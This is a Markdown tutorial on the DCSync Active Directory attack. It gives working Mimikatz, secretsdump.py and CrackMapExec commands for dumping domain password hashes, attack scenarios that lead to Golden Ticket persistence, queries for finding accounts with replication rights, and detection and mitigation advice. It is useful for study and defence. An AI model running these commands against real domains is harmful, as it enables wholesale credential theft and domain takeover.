# 🔄 DCSync Attack — Active Directory Credential Extraction

**DCSync** is a powerful Active Directory attack technique that allows an attacker to **impersonate a Domain Controller** and request password hashes for any domain user — including the KRBTGT account and all Domain Admins.

> DCSync does NOT require code execution on the Domain Controller itself. It uses the legitimate **Directory Replication Service (DRS)** protocol.

---

## 🧠 How DCSync Works

In a normal AD environment:

1. Multiple Domain Controllers sync data using **replication**.
2. DRS Remote Protocol (`MS-DRSR`) handles this.
3. One DC asks another: "Give me the latest changes for user X."

In a DCSync attack:

1. Attacker with sufficient privileges **pretends to be a DC**.
2. Sends a replication request to the real DC.
3. DC sends back the user's **password hash** (NTLM) and **Kerberos keys**.
4. Attacker receives credentials without touching LSASS or NTDS.dit.

---

## 🎯 Required Privileges

DCSync requires one of these permissions on the domain object:

| Permission | Description |
| --- | --- |
| **Replicating Directory Changes** | Required |
| **Replicating Directory Changes All** | Required |
| **Replicating Directory Changes In Filtered Set** | Sometimes needed |

These permissions are held by:

* Domain Admins
* Enterprise Admins
* Domain Controllers group
* Any account with delegated replication rights

---

## 🛠 Tools for DCSync

---

### 1️⃣ Mimikatz (Windows)

#### DCSync Specific User

```powershell
mimikatz.exe
lsadump::dcsync /domain:corp.local /user:Administrator
```

#### DCSync KRBTGT (for Golden Ticket)

```powershell
lsadump::dcsync /domain:corp.local /user:krbtgt
```

#### DCSync All Users

```powershell
lsadump::dcsync /domain:corp.local /all /csv
```

Output contains:

```
SAM Username : Administrator
Hash NTLM    : aad3b435b51404eeaad3b435b51404ee
```

---

### 2️⃣ Impacket — secretsdump.py (Linux)

#### DCSync Specific User

```bash
secretsdump.py corp.local/admin:Password@10.0.0.100 -just-dc-user krbtgt
```

#### DCSync All Users

```bash
secretsdump.py corp.local/admin:Password@10.0.0.100 -just-dc
```

#### Using NTLM Hash (Pass-the-Hash)

```bash
secretsdump.py corp.local/admin@10.0.0.100 -hashes :NTLM_HASH -just-dc
```

Output:

```
Administrator:500:aad3b435b51404ee:NTLM_HASH:::
krbtgt:502:aad3b435b51404ee:KRBTGT_HASH:::
```

---

### 3️⃣ CrackMapExec

```bash
crackmapexec smb 10.0.0.100 -u admin -p Password -d corp.local --ntds
```

Extracts all hashes via DCSync.

---

## 🔥 Realistic Attack Scenarios

---

### 🧨 Scenario 1: Post-Exploitation DCSync

1. Attacker compromises workstation via phishing.
2. Escalates to local admin.
3. Dumps LSASS → finds Domain Admin cached credentials.
4. Runs DCSync from compromised workstation:

   ```bash
   secretsdump.py corp.local/domainadmin:Password@10.0.0.100 -just-dc
   ```

5. Gets **every user's hash** in the domain.
6. Creates **Golden Ticket** with KRBTGT hash.
7. **Full domain persistence achieved.**

---

### 🧨 Scenario 2: Delegated Permissions Abuse

1. Attacker finds a service account with **Replicating Directory Changes** permission.
2. This was set up by an admin for a backup tool but never removed.
3. After compromising this account:

   ```bash
   secretsdump.py corp.local/backupsvc:BackupPass2020@10.0.0.100 -just-dc-user administrator
   ```

4. Gets Domain Admin hash → full compromise.

---

### 🧨 Scenario 3: Red Team Engagement

1. Red team achieves Domain Admin through lateral movement.
2. Instead of logging into DC (noisy), uses DCSync remotely.
3. Extracts all credentials silently.
4. Creates persistence via Golden Ticket.
5. Cleans up — no artifacts on DC.

---

## 📊 DCSync vs Other Credential Extraction Methods

| Method | Requires DC Access | Noisy | Risk of Detection |
| --- | --- | --- | --- |
| DCSync | ❌ No | Low | Medium |
| NTDS.dit copy | ✅ Yes | High | High |
| LSASS dump on DC | ✅ Yes | High | High |
| Volume Shadow Copy | ✅ Yes | Medium | Medium |

> DCSync is preferred because it's **remote** and **quiet**.

---

## 🔍 Finding DCSync-Capable Accounts

### PowerView

```powershell
Get-ObjectAcl -DistinguishedName "DC=corp,DC=local" -ResolveGUIDs | ? {
    ($_.ObjectAceType -match 'replication') -and 
    ($_.ActiveDirectoryRights -match 'ExtendedRight')
}
```

### BloodHound

Query:

```
MATCH (n)-[:DCSync]->(d:Domain) RETURN n
```

BloodHound visually shows all principals with DCSync rights.

---

## 🛡 Detection & Mitigation

### 🔎 Detection

Monitor for:

* **Event ID 4662** — Directory Service Access
  * Look for: `DS-Replication-Get-Changes` GUID operations
  * From non-DC source IPs
* **Event ID 4624** — Logon from unusual sources requesting replication
* Replication traffic from non-DC IP addresses
* Abnormal traffic to DC port 135/389/636

#### Splunk Detection Query

```
index=windows EventCode=4662 
    Properties="*Replicating Directory Changes*" 
    NOT (src_ip IN (dc_ip_list))
| stats count by src_ip, Account_Name
```

---

### 🔐 Mitigation

✅ Audit **Replicating Directory Changes** permissions regularly
✅ Remove unnecessary replication rights from accounts
✅ Monitor Event ID 4662 for replication from non-DC sources
✅ Use **Microsoft Defender for Identity** — detects DCSync
✅ Implement **Privileged Access Management (PAM)**
✅ Enable **AdminSDHolder** protection
✅ Use **credential tiering** — don't expose DA creds on workstations

---

## 🧠 DCSync Attack Chain Summary

```text
1. Compromise account with replication rights
2. Send DRS replication request to real DC
3. DC responds with password hashes
4. Extract KRBTGT hash
5. Create Golden Ticket
6. Persist indefinitely
```

---

## ⚠ Ethical Reminder

Everything discussed:

* Legal only in authorized labs
* Legal with written penetration testing authorization
* Illegal otherwise

---

## 📚 What to Learn Next

* 🎫 Golden Ticket creation with DCSync'd KRBTGT hash
* 🔍 BloodHound for finding DCSync paths
* 🛡 Building detection rules for DCSync
* 🧪 Setting up an AD lab to practice DCSync
